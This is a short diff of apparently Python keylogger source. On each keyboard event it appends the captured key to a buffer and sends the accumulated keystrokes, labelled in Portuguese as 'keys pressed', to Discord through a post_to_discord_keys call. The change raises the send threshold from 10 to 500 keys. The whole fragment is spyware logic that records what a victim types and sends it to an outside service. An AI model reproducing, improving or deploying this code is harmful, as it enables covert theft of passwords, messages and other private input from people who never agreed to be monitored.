@@ -119,7 +119,7 @@ def on_keyboard_event(event):
     if formatted_key:  
         captured_keys.append(formatted_key)
 
-    if len(captured_keys) >= 10 or int(time.time() - start_time) >= interval:
+    if len(captured_keys) >= 500 or int(time.time() - start_time) >= interval:
         if captured_keys:
             captured_text = "".join(captured_keys)  
             post_to_discord_keys(f"Teclas pressionadas: {captured_text}")
